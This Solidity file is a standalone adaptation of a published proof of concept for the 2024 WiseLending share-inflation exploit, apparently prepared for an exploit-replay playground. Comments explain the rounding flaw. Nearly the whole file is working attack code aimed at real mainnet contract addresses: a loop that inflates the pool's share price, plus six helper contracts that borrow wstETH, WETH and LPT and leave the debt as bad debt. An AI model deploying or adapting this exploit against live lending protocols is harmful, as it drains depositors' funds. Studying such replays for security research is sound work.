// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2024-01-WiseLending03).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `WiseLending` (a `Test`), which acts as `address(this)` == attacker and seeds
// itself via `deal(PendleLPT, address(this), ...)`. There is no standalone
// exploit contract in the original test — only a small `Helper` contract used
// for the borrow/bad-debt-donation leg. This file is a faithful, self-contained
// copy of the test's `testExploit()` body (moved into `run()`), plus the
// `Helper` contract copied verbatim, so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/WiseLending03_exp.sol. The `deal()` cheatcode is replicated by a
// `dealToken` setup step in the config (mints PendleLPT to this contract before
// run() executes), and the `vm.startPrank(attackerContract)` +
// `PositionNFTs.transferFrom(...)` step is replicated by a `rawCall` setup step
// impersonating the historical attacker contract.
//
// Root cause: WiseLending's lending-share conversion rounds asymmetrically in
// the protocol's favor (deposit floors, withdraw ceils), letting the holder of
// the pool's only share donate underlying while share count stays fixed and
// arbitrarily inflate the share price. A second donation channel — withdrawing
// 1 wei of collateral from a freshly-borrowed helper position — burns the whole
// collateral share and donates (sharePrice - 1) underlying while leaving the
// borrowed debt outstanding as bad debt, because the withdraw safety check only
// validates the *remaining* position, not the dust-rounding.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWiseLending {
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);

    function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);

    function withdrawExactAmount(
        uint256 _nftId,
        address _poolToken,
        uint256 _withdrawAmount
    ) external returns (uint256);

    function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);

    function getTotalPool(
        address _poolToken
    ) external view returns (uint256);

    function mintPosition() external returns (uint256);

    function lendingPoolData(
        address _poolToken
    ) external view returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);

    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
}

interface IPool is IERC20 {
    function depositExactAmount(
        uint256 _underlyingLpAssetAmount
    ) external returns (uint256, uint256);

    function withdrawExactShares(
        uint256 _shares
    ) external returns (uint256);

    function getPositionLendingShares(uint256, address) external returns (uint256);
}

interface PositionManager {
    function mintPosition() external returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract WiseLendingExploit {
    IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
    IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
    IWiseLending wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    PositionManager PositionNFTs = PositionManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    Helper[6] helpers;

    // Entry point: faithfully mirrors testExploit(). The PendleLPT seed
    // (`deal`) and the position-NFT-8 transfer (`vm.startPrank`) both happen as
    // pre-attack `setup` steps in the config; by the time run() executes, this
    // contract already holds 520.539781914590517894 PendleLPT and owns NFT #8.
    function run() external {
        PendleLPT.approve(address(LPTPoolToken), type(uint256).max);
        LPTPoolToken.depositExactAmount(PendleLPT.balanceOf(address(this)));
        LPTPoolToken.approve(address(wiseLending), type(uint256).max);

        // set WiseLending pool state: pseudoTotalPool(underlying): 2 wei, totalDepositShares(share): 1 wei
        wiseLending.withdrawExactShares(
            8, address(LPTPoolToken), wiseLending.getPositionLendingShares(8, address(LPTPoolToken))
        );
        (uint256 underlyingAmount, uint256 shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));

        // inflate share price by donating LPTPoolToken to wiseLending via rounding asymmetry
        while (underlyingAmount / shareAmount < 36 ether) {
            wiseLending.depositExactAmount(8, address(LPTPoolToken), underlyingAmount * 2 - 1); // rounds in favor of the protocol, deposit 2x - 1 underlying, mint 1 share
            wiseLending.withdrawExactAmount(8, address(LPTPoolToken), 1); // withdraw 1 underlying, burn 1 share
            (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        }

        // Mint 6 shares for withdrawing the donated LPTPoolToken
        wiseLending.depositExactAmount(8, address(LPTPoolToken), 6 * underlyingAmount);

        // Open a position to borrow assets in 6 new accounts.
        // Donate position collateral to the wiseLending pool through the incorrect health factor check.
        for (uint256 i = 0; i < 6; i++) {
            helpers[i] = new Helper();
        }
        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[0]), underlyingAmount / shareAmount + 10);
        helpers[0].borrow(wstETH, underlyingAmount / shareAmount + 1, 43_767_595_652_604_943_692);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[1]), underlyingAmount / shareAmount + 10);
        helpers[1].borrow(wstETH, underlyingAmount / shareAmount + 1, 50_020_109_317_262_792_792);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[2]), underlyingAmount / shareAmount + 10);
        helpers[2].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 23_443_463_776_915_873_010);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[3]), underlyingAmount / shareAmount + 10);
        helpers[3].borrow(WETH, underlyingAmount / shareAmount + 1, 73_498_936_139_651_450_633);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[4]), underlyingAmount / shareAmount + 10);
        helpers[4].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 27_742_814_258_725_671_652);

        (underlyingAmount, shareAmount,) = wiseLending.lendingPoolData(address(LPTPoolToken));
        LPTPoolToken.transfer(address(helpers[5]), underlyingAmount / shareAmount + 10);
        helpers[5].borrow(LPTPoolToken, underlyingAmount / shareAmount + 1, 48_332_561_371_175_655_788);

        // Withdraw donated LPTPoolTokens due to the increase in share price
        wiseLending.withdrawExactAmount(8, address(LPTPoolToken), wiseLending.getTotalPool(address(LPTPoolToken)));
        LPTPoolToken.withdrawExactShares(LPTPoolToken.balanceOf(address(this)));

        // Profit (WETH/wstETH/LPT) now sits on this contract; the recorder
        // scores `attacker`'s WETH delta (profitReceiver = "exploit" is not
        // used here — the attacker IS this deployed contract, since it is
        // deployed directly at run time with no separate EOA wrapper needed
        // for profit accounting beyond this contract's own balance).
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract Helper {
    IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
    IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
    IWiseLending wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    PositionManager PositionNFTs = PositionManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    function borrow(IERC20 asset, uint256 collateralAmount, uint256 debtAmount) external {
        uint256 positionId = PositionNFTs.mintPosition();
        LPTPoolToken.approve(address(wiseLending), type(uint256).max);
        wiseLending.depositExactAmount(positionId, address(LPTPoolToken), collateralAmount); // deposit collateral
        wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset

        // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt
        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1);

        asset.transfer(msg.sender, asset.balanceOf(address(this)));
        LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
